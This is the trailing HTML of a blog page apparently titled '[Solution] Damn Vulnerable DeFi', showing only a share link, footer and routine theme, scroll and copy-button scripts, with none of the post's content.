    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Damn Vulnerable DeFi on telegram"
        href="https://telegram.me/share/url?text=%5bSolution%5d%20Damn%20Vulnerable%20DeFi&amp;url=https%3a%2f%2finhack.github.io%2fposts%2fsolution-damn-vulnerable-defi%2f">
        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
            <path
                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
        </svg>
    </a>
</div>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="https://inhack.github.io/">inhack</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
